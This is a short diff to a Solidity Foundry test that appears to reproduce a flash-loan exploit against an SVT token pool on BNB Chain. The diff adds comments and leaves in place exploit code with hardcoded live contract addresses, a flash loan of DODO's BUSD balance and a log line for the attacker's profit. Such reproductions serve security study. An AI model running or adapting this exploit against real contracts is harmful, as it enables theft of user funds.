@@ -6,8 +6,8 @@ import "./interface.sol";
 
 contract ContractTest is Test {
     IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
-    IERC20 SVT = IERC20(0x657334B4FF7bDC4143941B1F94301f37659c6281);
-    ISVTpool pool = ISVTpool(0x2120F8F305347b6aA5E5dBB347230a8234EB3379);
+    IERC20 SVT = IERC20(0x657334B4FF7bDC4143941B1F94301f37659c6281); // not verify
+    ISVTpool pool = ISVTpool(0x2120F8F305347b6aA5E5dBB347230a8234EB3379); // not verify
     address dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
 
     function setUp() public {
@@ -17,7 +17,8 @@ contract ContractTest is Test {
     function testExploit() public {
         BUSD.approve(address(pool), type(uint256).max);
         SVT.approve(address(pool), type(uint256).max);
-        uint256 flash_amount = BUSD.balanceOf(dodo);
+        uint256 flash_amount = BUSD.balanceOf(dodo); // 600296101490916296932929
+
         DVM(dodo).flashLoan(0, flash_amount, address(this), new bytes(1));
 
         emit log_named_decimal_uint("[End] Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), 18);
@@ -39,6 +40,5 @@ contract ContractTest is Test {
         BUSD.transfer(dodo, quoteAmount);
                 
     }
-
 
 }
